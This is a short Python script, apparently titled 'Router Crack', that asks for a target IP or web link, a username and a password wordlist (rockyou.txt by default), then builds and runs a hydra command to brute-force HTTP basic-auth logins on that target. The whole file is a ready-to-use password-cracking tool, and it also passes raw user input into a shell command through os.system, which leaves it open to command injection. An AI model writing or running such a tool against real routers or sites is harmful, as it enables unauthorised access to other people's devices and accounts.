import cmd
import subprocess
import os
print("*************************************")
print("Д∂Ꮆ Яøυ✞ƎЯ ℂЯДℂƘ")
print("*************************************")

target = input("User Target ~ IP ADDRESS / WEB LINK: ")
username = input("Username: ")

bDefaultWordList = input('Use rockyou.txt? [Y,N]')
isValid = os.path.isfile('/usr/share/wordlists/rockyou.txt')

if bDefaultWordList == "Y":
 wordlist = "/usr/share/wordlists/rockyou.txt" 
 
else:
     wordlist = input("Directory of Wordlist: ")
 

command = 'hydra -l '+username+' -P '+wordlist+ ' -e ns -f -V ' + target + ' http-get /'
print(command)

os.system(command)




